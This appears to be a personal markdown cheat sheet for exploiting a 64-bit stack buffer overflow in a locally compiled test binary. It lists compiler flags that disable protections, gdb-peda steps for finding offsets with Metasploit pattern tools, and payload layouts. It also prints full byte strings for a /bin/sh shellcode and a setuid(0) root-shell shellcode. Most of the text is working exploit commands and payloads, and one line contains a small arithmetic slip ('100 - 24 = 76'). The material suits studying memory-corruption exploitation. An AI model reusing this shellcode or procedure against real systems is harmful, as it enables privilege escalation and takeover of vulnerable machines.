# 64 bit

## smashing stack

### compile file
```robert@laptop:~$ gcc -fno-stack-protector -z execstack buf.c -o buf```<br>
(note that stack protector is turned off and NX bit is removed via -z)

### debug file
```robert@laptop:~$ gdb -q buf```

### inspect assembler code
```gdb-peda$ set disassembly-flavor intel```
```gdb-peda$ disas main```<br>
check out structure of program in assembler

### overflow buffer
```gdb-peda$ r $(python -c "print 'A'*126")```

### check out registers and see where overflow took place
```gdb-peda$ info registers```<br>
pointers with addresses containing 41 are most likely overwritten by input above

### get offset of pointer rbp

### create payload
- 100 - 24 = 76 bytes junk (A's or NOPs)
- shellcode spawning a shell (24 bytes in this example)
```
\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
```
- 12 bytes junk (alignment space)
- 8 bytes junk (rbp)
- 6 bytes return address

### get return address
- run payload with return address filled with junk bytes
```
gdp-peda$ r $(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
```
- dump memory from buffer and determine return address
```
gdp-peda$ x/100x $rsp-200
```
- dumps 400 bytes from rsp-200 bytes in hex form
- return address should point to first byte after first junk (76 A's or NOPs)

### getting root
- same precedure as above but use a 48 bytes shellcode calling setuid(0);
```
\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
```

## calculating offset of pointers

### use metasploit frameworks pattern_create and pattern_find
```
robert@laptop:~$ /opt/metasploit/tools/exploit/pattern_create.rb -l 130
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
```
```
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
gdb-peda$ info registers
```
<br>
query address of rbp
```
robert@laptop:~$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 3964413864413764
[*] Exact match at offset 112
```
<br>
â†’ rbp starts at 112